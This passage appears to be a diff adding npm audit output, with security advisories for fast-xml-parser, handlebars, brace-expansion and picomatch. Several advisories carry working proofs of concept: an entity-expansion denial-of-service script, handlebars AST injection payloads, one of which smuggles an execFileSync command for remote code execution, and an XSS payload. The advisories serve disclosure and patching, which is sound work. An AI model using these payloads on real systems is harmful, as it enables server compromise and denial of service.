+      "overview": "## Summary\n\nThe `DocTypeReader` in fast-xml-parser uses JavaScript truthy checks to evaluate `maxEntityCount` and `maxEntitySize` configuration limits. When a developer explicitly sets either limit to `0` ΓÇö intending to disallow all entities or restrict entity size to zero bytes ΓÇö the falsy nature of `0` in JavaScript causes the guard conditions to short-circuit, completely bypassing the limits. An attacker who can supply XML input to such an application can trigger unbounded entity expansion, leading to memory exhaustion and denial of service.\n\n## Details\n\nThe `OptionsBuilder.js` correctly preserves a user-supplied value of `0` using nullish coalescing (`??`):\n\n```js\n// src/xmlparser/OptionsBuilder.js:111\nmaxEntityCount: value.maxEntityCount ?? 100,\n// src/xmlparser/OptionsBuilder.js:107\nmaxEntitySize: value.maxEntitySize ?? 10000,\n```\n\nHowever, `DocTypeReader.js` uses truthy evaluation to check these limits. Because `0` is falsy in JavaScript, the entire guard expression short-circuits to `false`, and the limit is never enforced:\n\n```js\n// src/xmlparser/DocTypeReader.js:30-32\nif (this.options.enabled !== false &&\n    this.options.maxEntityCount &&          // ΓåÉ 0 is falsy, skips check\n    entityCount >= this.options.maxEntityCount) {\n    throw new Error(`Entity count ...`);\n}\n```\n\n```js\n// src/xmlparser/DocTypeReader.js:128-130\nif (this.options.enabled !== false &&\n    this.options.maxEntitySize &&            // ΓåÉ 0 is falsy, skips check\n    entityValue.length > this.options.maxEntitySize) {\n    throw new Error(`Entity \"${entityName}\" size ...`);\n}\n```\n\nThe execution flow is:\n\n1. Developer configures `processEntities: { maxEntityCount: 0, maxEntitySize: 0 }` intending to block all entity definitions.\n2. `OptionsBuilder.normalizeProcessEntities` preserves the `0` values via `??` (correct behavior).\n3. Attacker supplies XML with a DOCTYPE containing many large entities.\n4. `DocTypeReader.readDocType` evaluates `this.options.maxEntityCount && ...` ΓÇö since `0` is falsy, the entire condition is `false`.\n5. `DocTypeReader.readEntityExp` evaluates `this.options.maxEntitySize && ...` ΓÇö same result.\n6. All entity count and size limits are bypassed; entities are parsed without restriction.\n\n## PoC\n\n```js\nconst { XMLParser } = require(\"fast-xml-parser\");\n\n// Developer intends: \"no entities allowed at all\"\nconst parser = new XMLParser({\n  processEntities: {\n    enabled: true,\n    maxEntityCount: 0,    // should mean \"zero entities allowed\"\n    maxEntitySize: 0       // should mean \"zero-length entities only\"\n  }\n});\n\n// Generate XML with many large entities\nlet entities = \"\";\nfor (let i = 0; i < 1000; i++) {\n  entities += `<!ENTITY e${i} \"${\"A\".repeat(100000)}\">`;\n}\n\nconst xml = `<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  ${entities}\n]>\n<foo>&e0;</foo>`;\n\n// This should throw \"Entity count exceeds maximum\" but does not\ntry {\n  const result = parser.parse(xml);\n  console.log(\"VULNERABLE: parsed without error, entities bypassed limits\");\n} catch (e) {\n  console.log(\"SAFE:\", e.message);\n}\n\n// Control test: setting maxEntityCount to 1 correctly blocks\nconst safeParser = new XMLParser({\n  processEntities: {\n    enabled: true,\n    maxEntityCount: 1,\n    maxEntitySize: 100\n  }\n});\n\ntry {\n  safeParser.parse(xml);\n  console.log(\"ERROR: should have thrown\");\n} catch (e) {\n  console.log(\"CONTROL:\", e.message);  // \"Entity count (2) exceeds maximum allowed (1)\"\n}\n```\n\n**Expected output:**\n```\nVULNERABLE: parsed without error, entities bypassed limits\nCONTROL: Entity count (2) exceeds maximum allowed (1)\n```\n\n## Impact\n\n- **Denial of Service:** An attacker supplying crafted XML with thousands of large entity definitions can exhaust server memory in applications where the developer configured `maxEntityCount: 0` or `maxEntitySize: 0`, intending to prohibit entities entirely.\n- **Security control bypass:** Developers who explicitly set restrictive limits to `0` receive no protection ΓÇö the opposite of their intent. This creates a false sense of security.\n- **Scope:** Only applications that explicitly set these limits to `0` are affected. The default configuration (`maxEntityCount: 100`, `maxEntitySize: 10000`) is not vulnerable. The `enabled: false` option correctly disables entity processing entirely and is not affected.\n\n## Recommended Fix\n\nReplace the truthy checks in `DocTypeReader.js` with explicit type checks that correctly treat `0` as a valid numeric limit:\n\n```js\n// src/xmlparser/DocTypeReader.js:30-32 ΓÇö replace:\nif (this.options.enabled !== false &&\n    this.options.maxEntityCount &&\n    entityCount >= this.options.maxEntityCount) {\n\n// with:\nif (this.options.enabled !== false &&\n    typeof this.options.maxEntityCount === 'number' &&\n    entityCount >= this.options.maxEntityCount) {\n```\n\n```js\n// src/xmlparser/DocTypeReader.js:128-130 ΓÇö replace:\nif (this.options.enabled !== false &&\n    this.options.maxEntitySize &&\n    entityValue.length > this.options.maxEntitySize) {\n\n// with:\nif (this.options.enabled !== false &&\n    typeof this.options.maxEntitySize === 'number' &&\n    entityValue.length > this.options.maxEntitySize) {\n```\n\n# Workaround\n\nIf you don't want to processed the entities, keep the processEntities flag to false instead of setting any limit to 0.",
+      "reported_by": null,
+      "title": "Entity Expansion Limits Bypassed When Set to Zero Due to JavaScript Falsy Evaluation in fast-xml-parser",
+      "metadata": null,
+      "cves": ["CVE-2026-33349"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-xml-parser",
+      "vulnerable_versions": ">=4.0.0-beta.3 <=5.5.6",
+      "github_advisory_id": "GHSA-jp2q-39xq-3w4g",
+      "recommendation": "Upgrade to version 5.5.7 or later",
+      "patched_versions": ">=5.5.7",
+      "updated": "2026-03-25T18:33:23.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": ["CWE-1284"],
+      "url": "https://github.com/advisories/GHSA-jp2q-39xq-3w4g"
+    },
+    "1115538": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": ["packages__adapters>ts-jest>handlebars"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-3mfm-83xf-c92r\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33938\n- https://github.com/advisories/GHSA-3mfm-83xf-c92r",
+      "created": "2026-03-27T18:20:44.000Z",
+      "id": 1115538,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe `@partial-block` special variable is stored in the template data context and is reachable and mutable from within a template via helpers that accept arbitrary objects. When a helper overwrites `@partial-block` with a crafted Handlebars AST, a subsequent invocation of `{{> @partial-block}}` compiles and executes that AST, enabling arbitrary JavaScript execution on the server.\n\n## Description\n\nHandlebars stores `@partial-block` in the `data` frame that is accessible to templates. In nested contexts, a parent frame's `@partial-block` is reachable as `@_parent.partial-block`. Because the data frame is a mutable object, any registered helper that accepts an object reference and assigns properties to it can overwrite `@partial-block` with an attacker-controlled value.\n\nWhen `{{> @partial-block}}` is subsequently evaluated, `invokePartial` receives the crafted object. The runtime, finding an object that is not a compiled function, falls back to **dynamically compiling** the value via `env.compile()`. If that value is a well-formed Handlebars AST containing injected code, the injected JavaScript runs in the server process.\n\nThe `handlebars-helpers` npm package (commonly used with Handlebars) includes several helpers such as `merge` that can be used as the mutation primitive.\n\n## Proof of Concept\n\nTested with Handlebars 4.7.8 and `handlebars-helpers`:\n\n```javascript\nconst Handlebars = require('handlebars');\nconst merge = require('handlebars-helpers').object().merge;\nHandlebars.registerHelper('merge', merge);\n\nconst vulnerableTemplate = `\n{{#*inline \"myPartial\"}}\n    {{>@partial-block}}\n    {{>@partial-block}}\n{{/inline}}\n{{#>myPartial}}\n    {{merge @_parent partial-block=1}}\n    {{merge @_parent partial-block=payload}}\n{{/myPartial}}\n`;\n\nconst maliciousContext = {\n  payload: {\n    type: \"Program\",\n    body: [\n      {\n        type: \"MustacheStatement\",\n        depth: 0,\n        path: {\n          type: \"PathExpression\",\n          parts: [\"pop\"],\n          original: \"this.pop\",\n          // Code injected via depth field ΓÇö breaks out of generated function call\n          depth: \"0])),function () {console.error('VULNERABLE: RCE via @partial-block');}()));//\",\n        },\n      },\n    ],\n  },\n};\n\nHandlebars.compile(vulnerableTemplate)(maliciousContext);\n// Prints: VULNERABLE: RCE via @partial-block\n```\n\n## Workarounds\n\n- **Use the runtime-only build** (`require('handlebars/runtime')`). The `compile()` method is  absent, eliminating the vulnerable fallback path.\n- **Audit registered helpers** for any that write arbitrary values to context objects. Helpers  should treat context data as read-only.\n- **Avoid registering helpers** from third-party packages (such as `handlebars-helpers`) in  contexts where templates or context data can be influenced by untrusted input.",
+      "reported_by": null,
+      "title": "Handlebars.js has JavaScript Injection via AST Type Confusion by tampering @partial-block",
+      "metadata": null,
+      "cves": ["CVE-2026-33938"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-3mfm-83xf-c92r",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-27T21:52:26.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": ["CWE-94", "CWE-843"],
+      "url": "https://github.com/advisories/GHSA-3mfm-83xf-c92r"
+    },
+    "1115539": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": ["packages__adapters>ts-jest>handlebars"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-2w6w-674q-4c4q\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33937\n- https://github.com/advisories/GHSA-2w6w-674q-4c4q",
+      "created": "2026-03-27T18:19:58.000Z",
+      "id": 1115539,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`Handlebars.compile()` accepts a pre-parsed AST object in addition to a template string. The `value` field of a `NumberLiteral` AST node is emitted directly into the generated JavaScript without quoting or sanitization. An attacker who can supply a crafted AST to `compile()` can therefore inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`Handlebars.compile()` accepts either a template string or a pre-parsed AST. When an AST is supplied, the JavaScript code generator in `lib/handlebars/compiler/javascript-compiler.js` emits `NumberLiteral` values verbatim:\n\n```javascript\n// Simplified representation of the vulnerable code path:\n// NumberLiteral.value is appended to the generated code without escaping\ncompiledCode += numberLiteralNode.value;\n```\n\nBecause the value is not wrapped in quotes or otherwise sanitized, passing a string such as `{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() //` as the `value` of a `NumberLiteral` causes the generated `eval`-ed code to break out of its intended context and execute arbitrary commands.\n\nAny endpoint that deserializes user-controlled JSON and passes the result directly to `Handlebars.compile()` is exploitable.\n\n## Proof of Concept\n\nServer-side Express application that passes `req.body.text` to `Handlebars.compile()`:\n\n\n```Javascript\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"/api/render\", (req, res) => {\n  let text = req.body.text;\n  let template = Handlebars.compile(text);\n  let result = template();\n  res.send(result);\n});\n\napp.listen(2123);\n```\n\n```\nPOST /api/render HTTP/1.1\nContent-Type: application/json\nHost: 127.0.0.1:2123\n\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"body\": [\n      {\n        \"type\": \"MustacheStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\",\n          \"data\": false,\n          \"depth\": 0,\n          \"parts\": [\"lookup\"],\n          \"original\": \"lookup\",\n          \"loc\": null\n        },\n        \"params\": [\n          {\n            \"type\": \"PathExpression\",\n            \"data\": false,\n            \"depth\": 0,\n            \"parts\": [],\n            \"original\": \"this\",\n            \"loc\": null\n          },\n          {\n            \"type\": \"NumberLiteral\",\n            \"value\": \"{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() //\",\n            \"original\": 1,\n            \"loc\": null\n          }\n        ],\n        \"escaped\": true,\n        \"strip\": { \"open\": false, \"close\": false },\n        \"loc\": null\n      }\n    ]\n  }\n}\n```\n\nThe response body will contain the output of the `id` command executed on the server.\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.",
+      "reported_by": null,
+      "title": "Handlebars.js has JavaScript Injection via AST Type Confusion",
+      "metadata": null,
+      "cves": ["CVE-2026-33937"],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-2w6w-674q-4c4q",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-27T21:52:19.000Z",
+      "cvss": {
+        "score": 9.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": ["CWE-94", "CWE-843"],
+      "url": "https://github.com/advisories/GHSA-2w6w-674q-4c4q"
+    },
+    "1115543": {
+      "findings": [
+        {
+          "version": "5.0.4",
+          "paths": [
+            ".>@typescript-eslint/eslint-plugin>@typescript-eslint/type-utils>@typescript-eslint/typescript-estree>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v\n- https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113\n- https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184\n- https://github.com/juliangruber/brace-expansion/issues/98\n- https://github.com/juliangruber/brace-expansion/pull/95\n- https://github.com/juliangruber/brace-expansion/pull/96\n- https://github.com/juliangruber/brace-expansion/pull/97\n- https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5\n- https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2\n- https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33750\n- https://github.com/advisories/GHSA-f886-m6hf-6m8v",
+      "created": "2026-03-26T18:29:42.000Z",
+      "id": 1115543,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.\n\nThe loop in question:\n\nhttps://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184\n\n`test()` is one of\n\nhttps://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113\n\nThe increment is computed as `Math.abs(0) = 0`, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a `RangeError`. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.\n\nThis affects any application that passes untrusted strings to expand(), or by error sets a step value of `0`. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.\n\n### Patches\n\n\nUpgrade to versions\n- 5.0.5+\n\nA step increment of 0 is now sanitized to 1, which matches bash behavior.\n\n### Workarounds\n\nSanitize strings passed to `expand()` to ensure a step value of `0` is not used.",
+      "reported_by": null,
+      "title": "brace-expansion: Zero-step sequence causes process hang and memory exhaustion",
+      "metadata": null,
+      "cves": ["CVE-2026-33750"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=4.0.0 <5.0.5",
+      "github_advisory_id": "GHSA-f886-m6hf-6m8v",
+      "recommendation": "Upgrade to version 5.0.5 or later",
+      "patched_versions": ">=5.0.5",
+      "updated": "2026-03-27T21:38:55.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+      },
+      "cwe": ["CWE-400"],
+      "url": "https://github.com/advisories/GHSA-f886-m6hf-6m8v"
+    },
+    "1115544": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": ["packages__adapters>ts-jest>handlebars"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-2qvq-rjwj-gvw9\n- https://nvd.nist.gov/vuln/detail/CVE-2021-23369\n- https://nvd.nist.gov/vuln/detail/CVE-2021-23383\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33916\n- https://github.com/advisories/GHSA-2qvq-rjwj-gvw9",
+      "created": "2026-03-26T22:20:51.000Z",
+      "id": 1115544,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`resolvePartial()` in the Handlebars runtime resolves partial names via a plain property lookup on `options.partials` without guarding against prototype-chain traversal. When `Object.prototype` has been polluted with a string value whose key matches a partial reference in a template, the polluted string is used as the partial body and rendered **without HTML escaping**, resulting in reflected or stored XSS.\n\n## Description\n\nThe root cause is in `lib/handlebars/runtime.js` inside `resolvePartial()` and `invokePartial()`:\n\n```javascript\n// Vulnerable: plain bracket access traverses Object.prototype\npartial = options.partials[options.name];\n```\n\n`hasOwnProperty` is never checked, so if `Object.prototype` has been seeded with a key whose name matches a partial reference in the template (e.g. `widget`), the lookup succeeds and the polluted string is returned. The runtime emits a prototype-access warning, but the partial is still resolved and its content is inserted into the rendered output unescaped. This contradicts the documented security model and is distinct from CVE-2021-23369 and CVE-2021-23383, which addressed data property access rather than partial template resolution.\n\n**Prerequisites for exploitation:**\n1. The target application must be vulnerable to prototype pollution (e.g. via `qs`, `minimist`, or\n   any querystring/JSON merge sink).\n2. The attacker must know or guess the name of a partial reference used in a template.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars');\n\n// Step 1: Prototype pollution (via qs, minimist, or another vector)\nObject.prototype.widget = '<img src=x onerror=\"alert(document.domain)\">';\n\n// Step 2: Normal template that references a partial\nconst template = Handlebars.compile('<div>Welcome! {{> widget}}</div>');\n\n// Step 3: Render ΓÇö XSS payload injected unescaped\nconst output = template({});\n// Output: <div>Welcome! <img src=x onerror=\"alert(document.domain)\"></div>\n```\n\n> The runtime prints a prototype access warning claiming \"access has been denied,\" but the partial still resolves and returns the polluted value.\n\n## Workarounds\n\n- Apply `Object.freeze(Object.prototype)` early in application startup to prevent prototype  pollution. Note: this may break other libraries.\n- Use the Handlebars runtime-only build (`handlebars/runtime`), which does not compile templates  and reduces the attack surface.",
+      "reported_by": null,
+      "title": "Handlebars.js has Prototype Pollution Leading to XSS through Partial Template Injection",
+      "metadata": null,
+      "cves": ["CVE-2026-33916"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <4.7.9",
+      "github_advisory_id": "GHSA-2qvq-rjwj-gvw9",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-27T21:52:04.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": ["CWE-79", "CWE-1321"],
+      "url": "https://github.com/advisories/GHSA-2qvq-rjwj-gvw9"
+    },
+    "1115549": {
+      "findings": [
+        {
+          "version": "2.3.1",
+          "paths": [".>lint-staged>micromatch>picomatch"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-3v7f-55p6-f55p\n- https://github.com/micromatch/picomatch/commit/4516eb521f13a46b2fe1a1d2c9ef6b20ddc0e903\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33672\n- https://github.com/advisories/GHSA-3v7f-55p6-f55p",
+      "created": "2026-03-25T21:13:39.000Z",
+      "id": 1115549,
+      "npm_advisory_id": null,
+      "overview": "### Impact\npicomatch is vulnerable to a **method injection vulnerability (CWE-1321)** affecting the `POSIX_REGEX_SOURCE` object. Because the object inherits from `Object.prototype`, specially crafted POSIX bracket expressions (e.g., `[[:constructor:]]`) can reference inherited method names. These methods are implicitly converted to strings and injected into the generated regular expression.\n\nThis leads to **incorrect glob matching behavior (integrity impact)**, where patterns may match unintended filenames. The issue does **not enable remote code execution**, but it can cause security-relevant logic errors in applications that rely on glob matching for filtering, validation, or access control.\n\nAll users of affected `picomatch` versions that process untrusted or user-controlled glob patterns are potentially impacted.\n\n### Patches\n\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\n\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to picomatch.\n\nPossible mitigations include:\n- Sanitizing or rejecting untrusted glob patterns, especially those containing POSIX character classes like `[[:...:]]`.\n- Avoiding the use of POSIX bracket expressions if user input is involved.\n- Manually patching the library by modifying `POSIX_REGEX_SOURCE` to use a null prototype:\n\n  ```js\n  const POSIX_REGEX_SOURCE = {\n    __proto__: null,\n    alnum: 'a-zA-Z0-9',\n    alpha: 'a-zA-Z',\n    // ... rest unchanged\n  };\n  \n### Resources\n\n- fix for similar issue: https://github.com/micromatch/picomatch/pull/144\n- picomatch repository https://github.com/micromatch/picomatch",
+      "reported_by": null,
+      "title": "Picomatch: Method Injection in POSIX Character Classes causes incorrect Glob Matching",
+      "metadata": null,
+      "cves": ["CVE-2026-33672"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "picomatch",
+      "vulnerable_versions": "<2.3.2",
+      "github_advisory_id": "GHSA-3v7f-55p6-f55p",
+      "recommendation": "Upgrade to version 2.3.2 or later",
+      "patched_versions": ">=2.3.2",
+      "updated": "2026-03-27T21:36:25.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": ["CWE-1321"],
+      "url": "https://github.com/advisories/GHSA-3v7f-55p6-f55p"
+    },
+    "1115551": {
+      "findings": [
+        {
+          "version": "4.0.3",
+          "paths": [
+            ".>@typescript-eslint/eslint-plugin>@typescript-eslint/type-utils>@typescript-eslint/typescript-estree>tinyglobby>picomatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-3v7f-55p6-f55p\n- https://github.com/micromatch/picomatch/commit/4516eb521f13a46b2fe1a1d2c9ef6b20ddc0e903\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33672\n- https://github.com/advisories/GHSA-3v7f-55p6-f55p",
+      "created": "2026-03-25T21:13:39.000Z",
+      "id": 1115551,
+      "npm_advisory_id": null,
+      "overview": "### Impact\npicomatch is vulnerable to a **method injection vulnerability (CWE-1321)** affecting the `POSIX_REGEX_SOURCE` object. Because the object inherits from `Object.prototype`, specially crafted POSIX bracket expressions (e.g., `[[:constructor:]]`) can reference inherited method names. These methods are implicitly converted to strings and injected into the generated regular expression.\n\nThis leads to **incorrect glob matching behavior (integrity impact)**, where patterns may match unintended filenames. The issue does **not enable remote code execution**, but it can cause security-relevant logic errors in applications that rely on glob matching for filtering, validation, or access control.\n\nAll users of affected `picomatch` versions that process untrusted or user-controlled glob patterns are potentially impacted.\n\n### Patches\n\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\n\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to picomatch.\n\nPossible mitigations include:\n- Sanitizing or rejecting untrusted glob patterns, especially those containing POSIX character classes like `[[:...:]]`.\n- Avoiding the use of POSIX bracket expressions if user input is involved.\n- Manually patching the library by modifying `POSIX_REGEX_SOURCE` to use a null prototype:\n\n  ```js\n  const POSIX_REGEX_SOURCE = {\n    __proto__: null,\n    alnum: 'a-zA-Z0-9',\n    alpha: 'a-zA-Z',\n    // ... rest unchanged\n  };\n  \n### Resources\n\n- fix for similar issue: https://github.com/micromatch/picomatch/pull/144\n- picomatch repository https://github.com/micromatch/picomatch",
+      "reported_by": null,
+      "title": "Picomatch: Method Injection in POSIX Character Classes causes incorrect Glob Matching",
+      "metadata": null,
+      "cves": ["CVE-2026-33672"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "picomatch",
+      "vulnerable_versions": ">=4.0.0 <4.0.4",
+      "github_advisory_id": "GHSA-3v7f-55p6-f55p",
+      "recommendation": "Upgrade to version 4.0.4 or later",
+      "patched_versions": ">=4.0.4",
+      "updated": "2026-03-27T21:36:25.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": ["CWE-1321"],
+      "url": "https://github.com/advisories/GHSA-3v7f-55p6-f55p"
+    },
+    "1115552": {
+      "findings": [
+        {
+          "version": "2.3.1",
+          "paths": [".>lint-staged>micromatch>picomatch"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-c2c7-rcm5-vvqj\n- https://github.com/micromatch/picomatch/commit/5eceecd27543b8e056b9307d69e105ea03618a7d\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33671\n- https://github.com/advisories/GHSA-c2c7-rcm5-vvqj",
+      "created": "2026-03-25T21:12:07.000Z",
+      "id": 1115552,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n`picomatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing crafted extglob patterns. Certain patterns using extglob quantifiers such as `+()` and `*()`, especially when combined with overlapping alternatives or nested extglobs, are compiled into regular expressions that can exhibit catastrophic backtracking on non-matching input.\n\nExamples of problematic patterns include `+(a|aa)`, `+(*|?)`, `+(+(a))`, `*(+(a))`, and `+(+(+(a)))`. In local reproduction, these patterns caused multi-second event-loop blocking with relatively short inputs. For example, `+(a|aa)` compiled to `^(?:(?=.)(?:a|aa)+)$` and took about 2 seconds to reject a 41-character non-matching input, while nested patterns such as `+(+(a))` and `*(+(a))` took around 29 seconds to reject a 33-character input on a modern M1 MacBook.\n\nApplications are impacted when they allow untrusted users to supply glob patterns that are passed to `picomatch` for compilation or matching. In those cases, an attacker can cause excessive CPU consumption and block the Node.js event loop, resulting in a denial of service. Applications that only use trusted, developer-controlled glob patterns are much less likely to be exposed in a security-relevant way.\n\n### Patches\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to `picomatch`.\n\nPossible mitigations include:\n- disable extglob support for untrusted patterns by using `noextglob: true`\n- reject or sanitize patterns containing nested extglobs or extglob quantifiers such as `+()` and `*()`\n- enforce strict allowlists for accepted pattern syntax\n- run matching in an isolated worker or separate process with time and resource limits\n- apply application-level request throttling and input validation for any endpoint that accepts glob patterns\n\n### Resources\n- Picomatch repository: https://github.com/micromatch/picomatch\n- `lib/parse.js` and `lib/constants.js` are involved in generating the vulnerable regex forms\n- Comparable ReDoS precedent: CVE-2024-4067 (`micromatch`)\n- Comparable generated-regex precedent: CVE-2024-45296 (`path-to-regexp`)",
+      "reported_by": null,
+      "title": "Picomatch has a ReDoS vulnerability via extglob quantifiers",
+      "metadata": null,
+      "cves": ["CVE-2026-33671"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "picomatch",
+      "vulnerable_versions": "<2.3.2",
+      "github_advisory_id": "GHSA-c2c7-rcm5-vvqj",
+      "recommendation": "Upgrade to version 2.3.2 or later",
+      "patched_versions": ">=2.3.2",
+      "updated": "2026-03-27T21:36:14.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": ["CWE-1333"],
+      "url": "https://github.com/advisories/GHSA-c2c7-rcm5-vvqj"
+    },
+    "1115554": {
+      "findings": [
+        {
+          "version": "4.0.3",
+          "paths": [
+            ".>@typescript-eslint/eslint-plugin>@typescript-eslint/type-utils>@typescript-eslint/typescript-estree>tinyglobby>picomatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-c2c7-rcm5-vvqj\n- https://github.com/micromatch/picomatch/commit/5eceecd27543b8e056b9307d69e105ea03618a7d\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33671\n- https://github.com/advisories/GHSA-c2c7-rcm5-vvqj",
+      "created": "2026-03-25T21:12:07.000Z",
+      "id": 1115554,
+      "npm_advisory_id": null,
